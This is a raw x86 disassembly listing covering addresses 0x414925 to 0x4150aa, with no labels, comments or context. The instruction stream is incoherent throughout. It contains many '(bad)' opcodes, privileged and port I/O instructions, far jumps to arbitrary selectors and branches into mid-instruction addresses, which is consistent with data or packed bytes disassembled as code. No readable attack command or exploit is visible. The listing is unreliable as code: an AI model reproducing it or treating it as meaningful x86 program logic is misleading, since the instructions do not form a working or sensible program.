  414925:	shr    BYTE PTR [eax+ecx*4+0x109bd9b9],0x2
  41492d:	mov    bl,0xcd
  41492f:	sbb    edi,edx
  414931:	pop    edx
  414932:	xchg   ecx,eax
  414933:	cmc    
  414934:	sbb    DWORD PTR [esi+0x73],ebx
  414937:	adc    al,dl
  414939:	rcr    ah,cl
  41493b:	jbe    0x41493d
  41493d:	jae    0x41498e
  41493f:	dec    ecx
  414940:	push   ebx
  414941:	stc    
  414942:	or     dl,bl
  414944:	mov    eax,0xf4e33151
  414949:	or     bl,BYTE PTR [ecx]
  41494b:	jg     0x4148d2
  41494d:	jb     0x414990
  41494f:	call   0xe08c:0x75d2a766
  414956:	rcl    DWORD PTR [ecx],cl
  414958:	je     0x4148e0
  41495a:	in     al,0xd
  41495c:	push   eax
  41495d:	adc    eax,DWORD PTR [esp+ebx*1-0x1d6db914]
  414964:	lds    esp,FWORD PTR [ebp+0x76]
  414967:	fs dec eax
  414969:	rcl    DWORD PTR gs:[eax-0x1f],1
  41496d:	ret    
  41496e:	cmp    eax,0x87451229
  414973:	dec    edx
  414974:	test   DWORD PTR [ecx+0x20],eax
  414977:	mov    eax,ds:0x3cace086
  41497c:	(bad)  
  41497e:	mov    esi,0xfa379640
  414983:	mov    eax,ebp
  414985:	cmp    al,0xf2
  414987:	xor    DWORD PTR [edx+0x4d9bfe44],edx
  41498d:	push   ds
  41498e:	dec    eax
  41498f:	sbb    DWORD PTR [eax-0x5eaf1f98],edx
  414995:	mov    ds:0x4ce1daa9,al
  41499a:	pop    esi
  41499b:	js     0x41495d
  41499d:	(bad)  
  41499e:	(bad)  [edi]
  4149a0:	sub    dh,BYTE PTR ds:0x4a9c071e
  4149a6:	push   DWORD PTR [esi-0xd4d2566]
  4149ac:	je     0x414a0f
  4149ae:	jno    0x4149f7
  4149b0:	push   esi
  4149b1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4149b2:	push   ebp
  4149b3:	stos   DWORD PTR es:[edi],eax
  4149b4:	pop    ebp
  4149b5:	push   edx
  4149b6:	dec    ebx
  4149b7:	adc    BYTE PTR ds:0x5e26425b,dl
  4149bd:	fstp   TBYTE PTR [eax+0x14]
  4149c0:	push   0xaa5b3e6a
  4149c5:	and    BYTE PTR [edx+0x5282d43a],bh
  4149cb:	pop    ecx
  4149cc:	pop    eax
  4149cd:	sbb    eax,0x793ac88
  4149d2:	xchg   ebx,eax
  4149d3:	cmp    cl,BYTE PTR [ecx+eax*4+0x52]
  4149d7:	pop    edi
  4149d8:	popf   
  4149d9:	fdivrp st(7),st
  4149db:	mov    ecx,0x6d808d4a
  4149e0:	pop    edi
  4149e1:	cmc    
  4149e2:	in     eax,0x10
  4149e4:	call   0xc538519
  4149e9:	dec    edx
  4149ea:	push   esi
  4149eb:	jns    0x4149af
  4149ed:	push   ebx
  4149ee:	inc    esp
  4149ef:	push   DWORD PTR [edx]
  4149f1:	pop    ebp
  4149f2:	pop    ss
  4149f3:	imul   ecx,DWORD PTR [edx+0x11b5729],0xe56cdef1
  4149fd:	div    ebp
  4149ff:	mov    edi,0x670916d2
  414a04:	aad    0xe
  414a06:	hlt    
  414a07:	stos   BYTE PTR es:[edi],al
  414a08:	shl    DWORD PTR [esi],1
  414a0a:	ss lahf 
  414a0c:	test   eax,0xcc794878
  414a11:	mov    ebp,0x94bc7889
  414a16:	pop    ds
  414a17:	(bad)  
  414a18:	xor    BYTE PTR [ecx+eiz*4+0x42],dl
  414a1c:	lahf   
  414a1d:	pop    es
  414a1e:	fimul  WORD PTR [esi]
  414a20:	mov    esi,DWORD PTR [ebx+0x3493651a]
  414a26:	neg    esi
  414a28:	jg     0x414a0d
  414a2a:	adc    al,0x78
  414a2c:	lds    edx,FWORD PTR [ebx+ebp*8]
  414a2f:	xor    DWORD PTR [edi+0x13],eax
  414a32:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414a33:	(bad)  
  414a34:	adc    al,0x87
  414a36:	mov    eax,0x5499dcec
  414a3b:	aas    
  414a3c:	push   esp
  414a3d:	mov    esi,0x8d7e403a
  414a42:	mov    bl,0xfc
  414a44:	pop    ds
  414a45:	fstp   TBYTE PTR [ebp-0x29a80329]
  414a4b:	fistp  WORD PTR ds:0xf7fed997
  414a51:	fild   WORD PTR [ebp+0x7d6b46d4]
  414a57:	push   ebx
  414a58:	js     0x414aa3
  414a5a:	gs out dx,al
  414a5c:	mov    eax,ds:0x8d6f7521
  414a61:	and    bl,BYTE PTR [eax-0x37]
  414a64:	xlat   BYTE PTR ds:[ebx]
  414a65:	sub    eax,0xd8b59bab
  414a6a:	(bad)  
  414a6c:	xchg   ecx,ebx
  414a6e:	ja     0x414ac5
  414a70:	and    ebp,DWORD PTR [edx+0x600745db]
  414a76:	dec    esi
  414a77:	in     eax,0x5d
  414a79:	pusha  
  414a7a:	or     BYTE PTR [ebx],ch
  414a7c:	or     al,0x81
  414a7e:	pop    es
  414a7f:	pop    ecx
  414a80:	pop    ss
  414a81:	out    0x36,eax
  414a83:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414a84:	jmp    0x99ce0206
  414a89:	retf   0x5580
  414a8c:	or     dh,ah
  414a8e:	lods   al,BYTE PTR ds:[esi]
  414a8f:	rcl    BYTE PTR [esi-0x66],1
  414a92:	and    eax,0xfa047cf1
  414a97:	out    dx,eax
  414a98:	jne    0x414b0b
  414a9a:	pusha  
  414a9b:	xchg   ebp,eax
  414a9c:	cld    
  414a9d:	sbb    ah,bh
  414a9f:	jne    0x414b04
  414aa1:	pop    esp
  414aa2:	mov    ds:0xaaeb9680,al
  414aa7:	retf   0x5bd5
  414aaa:	mov    ah,0x21
  414aac:	sub    edi,eax
  414aae:	or     al,0xfb
  414ab0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414ab1:	mov    ds:0xee954df7,al
  414ab6:	ss out dx,eax
  414ab8:	test   eax,0x909dd31a
  414abd:	in     eax,dx
  414abe:	inc    ebx
  414abf:	pop    ecx
  414ac0:	es loope 0x414aa7
  414ac3:	repz out dx,al
  414ac5:	ret    0x1034
  414ac8:	mov    bh,0x72
  414aca:	je     0x414b0b
  414acc:	mov    BYTE PTR [ebp+0x48],bl
  414acf:	cmp    esi,DWORD PTR [ebp+0x47f10e72]
  414ad5:	je     0x6f942c1f
  414adb:	adc    al,0x2d
  414add:	cmp    al,0x58
  414adf:	imul   esp,DWORD PTR [esi],0xe596b625
  414ae5:	cld    
  414ae6:	inc    ebx
  414ae7:	and    DWORD PTR [ecx],esp
  414ae9:	sub    BYTE PTR [ebx+0x6e],bh
  414aec:	fisubr WORD PTR [bp-0x7444]
  414af1:	and    BYTE PTR [ebp+0x7f],bh
  414af4:	pop    edi
  414af5:	adc    eax,ebp
  414af7:	addr16 (bad) 
  414af9:	imul   edx,DWORD PTR ds:0x94fb4b6e,0xffffffae
  414b00:	jne    0x414add
  414b02:	test   eax,esi
  414b04:	cmp    ch,BYTE PTR [edi]
  414b06:	cmp    cl,BYTE PTR [esi+0x3f]
  414b09:	psubw  mm3,QWORD PTR [ecx+0x4c]
  414b0d:	inc    ebx
  414b0e:	or     edx,DWORD PTR [esi+eiz*4+0x33d4b90]
  414b15:	xor    ax,0x5674
  414b19:	xchg   ebp,eax
  414b1a:	fwait
  414b1b:	gs stos BYTE PTR es:[edi],al
  414b1d:	jns    0x414b27
  414b1f:	xchg   ebp,eax
  414b20:	push   ss
  414b21:	scas   eax,DWORD PTR es:[edi]
  414b22:	mov    ch,0x4e
  414b24:	sbb    BYTE PTR ds:0xe0c93fd3,0xf8
  414b2b:	cmp    al,0x2c
  414b2d:	fld    DWORD PTR fs:[ecx+0x68]
  414b31:	push   ebx
  414b32:	ret    0xa6c9
  414b35:	dec    ebp
  414b36:	pusha  
  414b37:	jno    0x414b09
  414b39:	das    
  414b3a:	and    eax,0xb920b640
  414b3f:	gs jmp 0xdff0ff5e
  414b45:	pop    esp
  414b46:	lods   al,BYTE PTR ds:[esi]
  414b47:	inc    ebx
  414b48:	and    BYTE PTR [ebx+0x6e78fa8e],al
  414b4e:	das    
  414b4f:	mov    dh,BYTE PTR [edi+0x12]
  414b52:	mov    edi,0xaf0197da
  414b57:	inc    ebx
  414b58:	sub    bl,al
  414b5a:	push   edx
  414b5b:	add    dl,ah
  414b5d:	sub    BYTE PTR [esi+0x1],dl
  414b60:	bound  ecx,QWORD PTR [esi]
  414b62:	test   esp,eax
  414b64:	add    DWORD PTR [ebx+0x34],edx
  414b67:	fdivrp st(5),st
  414b69:	mov    dh,0x42
  414b6b:	dec    eax
  414b6c:	or     eax,ebx
  414b6e:	ds jl  0x414b11
  414b71:	push   esi
  414b72:	mov    ecx,0x854dbee7
  414b77:	dec    ebx
  414b78:	rol    BYTE PTR [edi],1
  414b7a:	xor    cl,ch
  414b7c:	rcl    dh,cl
  414b7e:	pop    eax
  414b7f:	and    eax,DWORD PTR [eax-0x3b2ab0e0]
  414b85:	jge    0x414bc7
  414b87:	pusha  
  414b88:	sub    eax,0x2870cbd1
  414b8d:	xchg   esp,eax
  414b8e:	test   bl,0xa4
  414b91:	xchg   edi,eax
  414b92:	jmp    0x2214:0xa0ed9a65
  414b99:	mov    al,ds:0x927e9d78
  414b9e:	(bad)  
  414b9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ba0:	sbb    eax,0xaa42bdae
  414ba5:	mov    dh,0xa5
  414ba7:	adc    BYTE PTR [ebp+0x4cb4c82e],ch
  414bad:	or     eax,0x1306c28f
  414bb2:	sbb    esi,DWORD PTR [esi-0x18]
  414bb5:	mov    esp,0x95b20ddd
  414bba:	lea    edx,[ebx]
  414bbc:	cmc    
  414bbd:	mov    WORD PTR [ecx+0x44096581],?
  414bc3:	mov    dh,0x90
  414bc5:	sbb    DWORD PTR [esp+edi*1],ebx
  414bc8:	fbld   TBYTE PTR ds:[eax-0x2f5851ab]
  414bcf:	loopne 0x414b83
  414bd1:	dec    esi
  414bd2:	xchg   BYTE PTR [edx+0x5566839d],ch
  414bd8:	or     eax,0xb030ef5d
  414bdd:	es xchg edx,eax
  414bdf:	mov    cs,WORD PTR [ebx+0x2e6953d7]
  414be5:	sub    bh,bl
  414be7:	jno    0x414ba9
  414be9:	push   ecx
  414bea:	out    dx,al
  414beb:	inc    ebp
  414bec:	inc    ebx
  414bed:	sub    BYTE PTR [ebp+0x4c],0x35
  414bf1:	add    eax,0x49213074
  414bf6:	adc    esp,eax
  414bf8:	cmp    BYTE PTR [eax+0x21],0xc9
  414bfc:	fs sahf 
  414bfe:	push   ebx
  414bff:	in     eax,0x33
  414c01:	ins    BYTE PTR es:[edi],dx
  414c02:	int    0x1a
  414c04:	int    0x6a
  414c06:	jbe    0x414bb0
  414c08:	xchg   esi,eax
  414c09:	popf   
  414c0a:	loope  0x414be3
  414c0c:	ds dec esp
  414c0e:	push   ebx
  414c0f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414c10:	in     eax,0x93
  414c12:	xor    BYTE PTR [edi-0x30282011],dh
  414c18:	cmp    DWORD PTR [esi],eax
  414c1a:	xlat   BYTE PTR ds:[ebx]
  414c1b:	xor    al,0xf9
  414c1d:	ds hlt 
  414c1f:	add    ebp,DWORD PTR [ebx]
  414c21:	push   cs
  414c22:	push   ds
  414c23:	iret   
  414c24:	test   eax,0x5126329f
  414c29:	scas   eax,DWORD PTR es:[edi]
  414c2a:	mov    ebx,0x1dd75374
  414c2f:	and    DWORD PTR [edx+0x61],edx
  414c32:	xchg   DWORD PTR [ebp+0x1e],esi
  414c35:	push   ss
  414c36:	test   al,0xe9
  414c38:	(bad)  
  414c39:	and    DWORD PTR [esi+edx*1],ecx
  414c3c:	and    dh,dh
  414c3e:	aas    
  414c3f:	test   eax,0x4d4ba484
  414c44:	sti    
  414c45:	out    dx,eax
  414c46:	push   ds
  414c47:	jecxz  0x414c95
  414c49:	jno    0x414c41
  414c4b:	sub    edi,ebp
  414c4d:	dec    esp
  414c4e:	mov    bh,0x95
  414c50:	xor    DWORD PTR [ebx-0xee9e2c9],0x2818d1e8
  414c5a:	mov    dl,0x46
  414c5c:	cmp    dh,BYTE PTR [esp+esi*4+0x37]
  414c60:	add    esp,ebx
  414c62:	sahf   
  414c63:	jmp    0xb7b0b487
  414c68:	inc    esi
  414c69:	test   eax,0x1b141061
  414c6e:	mov    edi,0xdb3c0bec
  414c73:	adc    DWORD PTR [edx],eax
  414c75:	xor    DWORD PTR [edi+edi*4],esp
  414c78:	scas   al,BYTE PTR es:[edi]
  414c79:	dec    ebp
  414c7a:	or     al,0x63
  414c7c:	sub    dl,BYTE PTR [edi-0x80]
  414c7f:	xor    ebp,esp
  414c81:	pop    esi
  414c82:	xor    al,0x57
  414c84:	jg     0x414c38
  414c86:	stc    
  414c87:	mov    esp,edx
  414c89:	aaa    
  414c8a:	mov    esp,0xc21ba8d7
  414c8f:	push   DWORD PTR [eax]
  414c91:	(bad)  
  414c92:	jns    0x414c8d
  414c94:	call   0x1c2fc7f6
  414c99:	or     BYTE PTR [ecx-0x410a43b8],dh
  414c9f:	jmp    0x414cdc
  414ca1:	and    al,0x40
  414ca3:	pusha  
  414ca4:	cdq    
  414ca5:	mov    edx,0x96586604
  414caa:	mov    cl,0x26
  414cac:	in     al,0x1d
  414cae:	lahf   
  414caf:	add    edx,ecx
  414cb1:	adc    al,0x18
  414cb3:	sbb    DWORD PTR [eax-0x65bc63b4],esp
  414cb9:	jg     0x414c63
  414cbb:	mov    esp,0xea7a5033
  414cc0:	ins    BYTE PTR es:[edi],dx
  414cc1:	ja     0x414c4f
  414cc3:	mov    bl,0xb6
  414cc5:	dec    esi
  414cc6:	jbe    0x414cb2
  414cc8:	xchg   ebp,eax
  414cc9:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  414ccb:	xchg   ebx,eax
  414ccc:	dec    esp
  414ccd:	mov    ds:0xfc66a81b,eax
  414cd2:	lods   eax,DWORD PTR ds:[esi]
  414cd3:	sub    al,0x55
  414cd5:	inc    esi
  414cd6:	into   
  414cd7:	sub    ah,bl
  414cd9:	in     eax,dx
  414cda:	dec    edi
  414cdb:	cmp    al,0x9b
  414cdd:	xchg   ebx,eax
  414cde:	xor    ah,BYTE PTR [edi+0x1b]
  414ce1:	adc    DWORD PTR [ebp+eiz*1-0x2a],esp
  414ce5:	mov    edx,0x2c627283
  414cea:	xlat   BYTE PTR ds:[ebx]
  414ceb:	test   bl,ah
  414ced:	inc    ebp
  414cee:	inc    eax
  414cef:	adc    DWORD PTR [ecx],esp
  414cf1:	inc    edi
  414cf2:	(bad)  
  414cf3:	out    dx,al
  414cf4:	leave  
  414cf5:	jmp    0x86a0:0xd109aeb3
  414cfc:	mov    bh,0x8a
  414cfe:	outs   dx,DWORD PTR ds:[esi]
  414cff:	data16 add al,0x54
  414d02:	push   0x536bb73a
  414d07:	ins    BYTE PTR es:[edi],dx
  414d08:	sbb    al,0x95
  414d0a:	mov    cl,0x7d
  414d0c:	push   es
  414d0d:	mov    bl,BYTE PTR [ecx+0x4d26f398]
  414d13:	scas   eax,DWORD PTR es:[edi]
  414d14:	mov    edx,0xbf410857
  414d19:	(bad)  
  414d1a:	fistp  QWORD PTR [edx-0x7b671ad2]
  414d20:	mov    ds,WORD PTR [ebx+edi*1+0x25c23e1c]
  414d27:	imul   ecx,DWORD PTR [ebx],0x30
  414d2a:	test   DWORD PTR [ebp-0x7d],esp
  414d2d:	xchg   esi,eax
  414d2e:	mov    ds:0x97ea93be,al
  414d33:	add    edx,DWORD PTR [edx]
  414d35:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d36:	add    eax,0x380bc6ed
  414d3b:	push   eax
  414d3c:	mov    dl,BYTE PTR [esi-0x5b]
  414d3f:	mov    ecx,0x80738375
  414d44:	jmp    0x83ea5bec
  414d49:	xchg   ebx,eax
  414d4a:	outs   dx,BYTE PTR ds:[esi]
  414d4b:	adc    al,0x70
  414d4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414d4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414d4f:	push   esi
  414d50:	ret    
  414d51:	daa    
  414d52:	lahf   
  414d53:	cmp    cl,BYTE PTR [ebp-0x4a14c243]
  414d59:	push   eax
  414d5a:	mov    edx,es
  414d5c:	mov    dh,0x58
  414d5e:	(bad)  
  414d5f:	ins    BYTE PTR es:[edi],dx
  414d60:	rcl    al,0x1c
  414d63:	adc    dh,dh
  414d65:	mov    edi,0x68d56b8a
  414d6a:	(bad)  
  414d6b:	cli    
  414d6c:	xchg   edi,eax
  414d6d:	fwait
  414d6e:	(bad)  
  414d6f:	fidiv  DWORD PTR [ebx]
  414d71:	sub    esp,ebp
  414d73:	cmc    
  414d74:	xchg   edx,eax
  414d75:	jnp    0x414cf8
  414d77:	xor    DWORD PTR [eax+0x75],eax
  414d7a:	xchg   ecx,edx
  414d7c:	ins    BYTE PTR es:[edi],dx
  414d7d:	inc    esi
  414d7e:	push   es
  414d7f:	jmp    0x414d43
  414d81:	cs push ss
  414d83:	pop    ebp
  414d84:	add    bh,ch
  414d86:	push   edi
  414d87:	test   ch,al
  414d89:	cdq    
  414d8a:	iret   
  414d8b:	pusha  
  414d8c:	or     ebp,DWORD PTR [ecx]
  414d8e:	into   
  414d8f:	outs   dx,BYTE PTR ds:[esi]
  414d90:	inc    ebp
  414d91:	or     edi,DWORD PTR [esi]
  414d93:	fnstcw WORD PTR [eax-0x45]
  414d96:	or     al,0xd7
  414d98:	clc    
  414d99:	out    0x67,eax
  414d9b:	lods   al,BYTE PTR ds:[esi]
  414d9c:	out    dx,eax
  414d9d:	shr    DWORD PTR [ecx+0x74cb3a74],1
  414da3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414da4:	iret   
  414da5:	mov    gs,WORD PTR [ebp+0x3de3360a]
  414dab:	push   0x22
  414dad:	fistp  DWORD PTR [ecx+0x1a762c77]
  414db3:	dec    ebp
  414db4:	popa   
  414db5:	inc    esi
  414db6:	add    ebp,esi
  414db8:	push   ss
  414db9:	jno    0x414d79
  414dbb:	jns    0x414e05
  414dbd:	sub    edi,edx
  414dbf:	xlat   BYTE PTR ds:[ebx]
  414dc0:	adc    eax,0xf96aec75
  414dc5:	xchg   ecx,eax
  414dc6:	hlt    
  414dc7:	in     eax,dx
  414dc8:	rcl    DWORD PTR [edx],cl
  414dca:	mov    ebp,0xddfceb24
  414dcf:	call   0x7db4:0xf104ec38
  414dd6:	loopne 0x414da5
  414dd8:	mov    edx,0x76d55c29
  414ddd:	enter  0x71ee,0x39
  414de1:	sbb    esi,ebx
  414de3:	jbe    0x414da9
  414de5:	mov    dh,0xf5
  414de7:	add    DWORD PTR [ecx],ecx
  414de9:	pop    esi
  414dea:	mov    ch,0x3e
  414dec:	mov    ch,0x60
  414dee:	pop    ebp
  414def:	icebp  
  414df0:	in     al,dx
  414df1:	lods   eax,DWORD PTR ds:[esi]
  414df2:	add    eax,0x9ab56729
  414df7:	arpl   WORD PTR [ebx],cx
  414df9:	ret    
  414dfa:	inc    ebp
  414dfb:	mov    al,0x56
  414dfd:	stc    
  414dfe:	mov    ds:0xec21a88e,al
  414e03:	xor    al,0x98
  414e05:	sub    eax,DWORD PTR [esi+esi*4-0x7f7bd69f]
  414e0c:	mov    ds:0x6d57117f,eax
  414e11:	test   BYTE PTR [ebx],dh
  414e13:	or     DWORD PTR [esi],eax
  414e15:	out    dx,eax
  414e16:	stc    
  414e17:	xor    BYTE PTR [ebx+0x225526cb],ch
  414e1d:	jns    0x414dec
  414e1f:	cmp    dl,ch
  414e21:	shr    DWORD PTR [esi-0x11],1
  414e24:	sbb    ebp,esp
  414e26:	popa   
  414e27:	push   edx
  414e28:	mov    cl,0x3f
  414e2a:	jle    0x414e88
  414e2c:	enter  0x289c,0xa1
  414e30:	jno    0x414de3
  414e32:	or     al,0x65
  414e34:	sub    ebp,DWORD PTR [ecx-0x32]
  414e37:	mov    BYTE PTR [edi],bh
  414e39:	cmp    edx,DWORD PTR [ebx]
  414e3b:	nop
  414e3c:	ins    DWORD PTR es:[edi],dx
  414e3d:	dec    eax
  414e3e:	imul   ecx,ebx,0x3b320be1
  414e44:	mov    edx,0xcdf8430f
  414e49:	cmp    BYTE PTR [eax],ch
  414e4b:	pop    ebp
  414e4c:	dec    ebx
  414e4d:	mov    WORD PTR [ecx+0x14],?
  414e50:	xchg   ebx,eax
  414e51:	adc    cl,al
  414e53:	push   esi
  414e54:	sbb    eax,DWORD PTR [edi-0x3f]
  414e57:	jle    0x414e2a
  414e59:	cs mov dh,0x23
  414e5c:	mov    BYTE PTR [edi+0x70b363b9],cl
  414e62:	sub    al,0xc2
  414e64:	(bad)  
  414e65:	sub    DWORD PTR [esi],edx
  414e67:	test   al,0x3f
  414e69:	lds    esp,FWORD PTR [ecx]
  414e6b:	ret    
  414e6c:	out    0x57,eax
  414e6e:	pop    eax
  414e6f:	mov    BYTE PTR [eax-0x2d21628],bl
  414e75:	jg     0x414e4b
  414e77:	pop    ss
  414e78:	ror    DWORD PTR [esp+ebp*8],cl
  414e7b:	and    dh,ah
  414e7d:	das    
  414e7e:	sbb    DWORD PTR [ecx-0x2dcab27f],0xffffffbc
  414e85:	mov    esp,DWORD PTR [ecx+0x3d]
  414e88:	sub    DWORD PTR ds:0xc7c28f08,0x7
  414e8f:	stc    
  414e90:	xchg   ecx,eax
  414e91:	jnp    0x414e74
  414e93:	cmc    
  414e94:	dec    edi
  414e95:	pop    esi
  414e96:	xchg   ecx,ebp
  414e98:	push   0x2a
  414e9a:	xor    eax,0xe8028cab
  414e9f:	stos   DWORD PTR es:[edi],eax
  414ea0:	jl     0x414e4f
  414ea2:	adc    bh,BYTE PTR [eax-0x503fee41]
  414ea8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414ea9:	push   es
  414eaa:	cmc    
  414eab:	sti    
  414eac:	jp     0x414e92
  414eae:	mov    cl,0x50
  414eb0:	(bad)  
  414eb1:	retf   0x19ed
  414eb4:	(bad)  
  414eb6:	push   ecx
  414eb7:	mov    bh,0x9a
  414eb9:	jo     0x414f18
  414ebb:	jns    0x414ed2
  414ebd:	push   ss
  414ebe:	mov    edi,0x5cf9f7df
  414ec3:	rcr    BYTE PTR [ebx],cl
  414ec5:	sub    eax,0x1c9239ae
  414eca:	push   cs
  414ecb:	fmul   st(5),st
  414ecd:	inc    edx
  414ece:	xor    eax,0x386249f0
  414ed3:	enter  0x8b21,0x56
  414ed7:	pop    esi
  414ed8:	ins    DWORD PTR es:[edi],dx
  414ed9:	dec    eax
  414eda:	loop   0x414e5d
  414edc:	ror    DWORD PTR [eax+edi*4+0x66e25cd3],0xdd
  414ee4:	out    dx,al
  414ee5:	sub    BYTE PTR [ecx-0x51721d12],0x98
  414eec:	push   edx
  414eed:	loopne 0x414f43
  414eef:	loop   0x414f4c
  414ef1:	mov    eax,ds:0x32827fdd
  414ef6:	jl     0x414f20
  414ef8:	xchg   edx,eax
  414ef9:	test   BYTE PTR [edi+0x632c1086],dl
  414eff:	sub    esp,edx
  414f01:	mov    BYTE PTR [ebp+edx*2-0x43],cl
  414f05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414f06:	dec    ecx
  414f07:	lea    esi,[ecx-0x3e]
  414f0a:	in     al,0xfd
  414f0c:	lods   eax,DWORD PTR ds:[esi]
  414f0d:	sub    eax,0x64bdd3bf
  414f12:	pushf  
  414f13:	lea    esi,[esi]
  414f15:	dec    esi
  414f16:	jmp    0x3ccb54c8
  414f1b:	pop    es
  414f1c:	(bad)  
  414f1d:	mov    al,ds:0x486f6f7a
  414f22:	imul   ecx,DWORD PTR [edi+0x1bf5cc80],0x4e53e09
  414f2c:	loop   0x414ec1
  414f2e:	pop    ebp
  414f2f:	xor    eax,0x52056a4f
  414f34:	ficom  WORD PTR [ecx]
  414f36:	and    al,0x1a
  414f38:	sbb    DWORD PTR [ebx],edi
  414f3a:	das    
  414f3b:	push   ebx
  414f3c:	xchg   ebx,eax
  414f3d:	scas   al,BYTE PTR es:[edi]
  414f3e:	dec    ebp
  414f3f:	mov    WORD PTR [ebx+0x521c4bf6],ss
  414f45:	out    0x64,al
  414f47:	jmp    0xc8cf7622
  414f4c:	lahf   
  414f4d:	les    ebp,FWORD PTR [ecx-0x16]
  414f50:	outs   dx,BYTE PTR ds:[esi]
  414f51:	pop    ecx
  414f52:	popf   
  414f53:	jg     0x414f14
  414f55:	out    dx,eax
  414f56:	inc    ebp
  414f57:	sub    ecx,0xdc6e4e98
  414f5d:	add    DWORD PTR [ecx+edx*2-0x19d874b],0x1b
  414f65:	mov    WORD PTR [edx],gs
  414f67:	cld    
  414f68:	fwait
  414f69:	push   edi
  414f6a:	dec    ebp
  414f6b:	adc    BYTE PTR [ecx],bh
  414f6d:	mov    bl,ah
  414f6f:	or     bl,0xc
  414f72:	fwait
  414f73:	test   BYTE PTR [ecx+0x35adabdb],cl
  414f79:	icebp  
  414f7a:	inc    ebp
  414f7b:	mov    bl,0x5e
  414f7d:	sub    al,0x97
  414f7f:	jecxz  0x414fbc
  414f81:	or     si,dx
  414f84:	jp     0x414f1a
  414f86:	pop    edi
  414f87:	inc    edi
  414f88:	inc    esp
  414f89:	cs out dx,eax
  414f8b:	jg     0x414f83
  414f8d:	clc    
  414f8e:	or     al,0x84
  414f90:	inc    eax
  414f91:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414f92:	sub    ebx,ebx
  414f94:	cmp    al,0x50
  414f96:	push   esp
  414f97:	(bad)  
  414f98:	xlat   BYTE PTR ds:[ebx]
  414f99:	push   esp
  414f9a:	call   0xdb4aab36
  414f9f:	pop    esp
  414fa0:	mov    cl,0x16
  414fa2:	call   0x7c9768f6
  414fa7:	mov    dl,0x72
  414fa9:	and    al,0xea
  414fab:	add    eax,ebp
  414fad:	hlt    
  414fae:	sbb    dl,0xca
  414fb1:	stos   DWORD PTR es:[edi],eax
  414fb2:	js     0x414fcb
  414fb4:	sbb    edx,DWORD PTR [edx-0x1ef262a3]
  414fba:	add    esp,DWORD PTR [esi-0x757cc296]
  414fc0:	pop    edi
  414fc1:	(bad)  
  414fc2:	pop    eax
  414fc3:	ja     0x415007
  414fc5:	add    eax,0xa73f7b20
  414fca:	inc    ecx
  414fcb:	xchg   edx,eax
  414fcc:	push   ds
  414fcd:	or     dh,BYTE PTR [edi]
  414fcf:	sbb    ah,BYTE PTR [eax]
  414fd1:	(bad)  
  414fd2:	jno    0x415000
  414fd4:	ds pop ebx
  414fd6:	xchg   ebx,eax
  414fd7:	pop    eax
  414fd8:	in     al,dx
  414fd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  414fda:	wbinvd 
  414fdc:	in     al,0xfc
  414fde:	ret    
  414fdf:	data16 mov al,ds:0x89d2ca39
  414fe5:	or     eax,0xd767eeb8
  414fea:	arpl   WORD PTR [ecx-0x4ad0337d],di
  414ff0:	gs idiv ebx
  414ff3:	and    BYTE PTR [ecx+0x1c58395],0xbf
  414ffa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414ffb:	sub    eax,0xf286eae5
  415000:	aam    0x5
  415002:	retf   
  415003:	and    ch,BYTE PTR [ebp+ecx*8-0x23bce9e2]
  41500a:	adc    ecx,0x69
  41500d:	(bad)  
  41500e:	xchg   ebp,eax
  41500f:	pop    es
  415010:	pop    ebx
  415011:	xchg   esi,eax
  415012:	xchg   bh,dl
  415014:	test   eax,0x7f1e79d3
  415019:	(bad)  
  41501a:	enter  0xbaa6,0x30
  41501e:	fistp  WORD PTR [esi]
  415020:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415021:	or     al,0xd3
  415023:	(bad)  
  415024:	test   ecx,0xfbc78625
  41502a:	push   0xd724689b
  41502f:	retf   
  415030:	xor    BYTE PTR [ebx],dh
  415032:	sbb    edx,esi
  415034:	inc    esp
  415035:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415036:	sbb    edi,DWORD PTR [eax-0x50]
  415039:	popf   
  41503a:	fadd   st,st(0)
  41503c:	sbb    ebx,DWORD PTR [edx+0x1b]
  41503f:	pop    ecx
  415040:	cmp    edx,DWORD PTR [ebx-0xfba2819]
  415046:	jg     0x4150c1
  415048:	gs push eax
  41504a:	fnstsw WORD PTR [esi-0x30776454]
  415050:	ret    0x8c40
  415053:	sahf   
  415054:	jg     0x414ff5
  415056:	lock or eax,0xa02c332e
  41505c:	test   al,0x6a
  41505e:	push   cs
  41505f:	test   al,0x54
  415061:	and    al,0xdc
  415063:	bound  ecx,QWORD PTR [ebp-0x5255deda]
  415069:	sub    esi,DWORD PTR [ebx+0x561989e]
  41506f:	test   eax,0x6f6c8a19
  415074:	jnp    0x4150a1
  415076:	cld    
  415077:	fnstenv [ebx-0x28]
  41507a:	xchg   DWORD PTR [edi+0x2b],ecx
  41507d:	xchg   esp,eax
  41507e:	add    BYTE PTR [edx+0x77a8dbf6],cl
  415084:	push   ds
  415085:	dec    edx
  415086:	push   edi
  415087:	inc    esp
  415088:	inc    esi
  415089:	in     al,0x29
  41508b:	bound  ebp,QWORD PTR [edx-0x19deba28]
  415091:	cmc    
  415092:	loop   0x41503e
  415094:	dec    ecx
  415095:	push   edi
  415096:	jbe    0x4150f9
  415098:	arpl   WORD PTR [eax],bx
  41509a:	ret    
  41509b:	sbb    eax,DWORD PTR [ecx]
  41509d:	bound  ebp,QWORD PTR [eax-0x76d96e48]
  4150a3:	cwde   
  4150a4:	sub    cl,dh
  4150a6:	sbb    BYTE PTR [ebp+0x59],al
  4150a9:	(bad)  
  4150aa:	mov    esi,0x38e202da
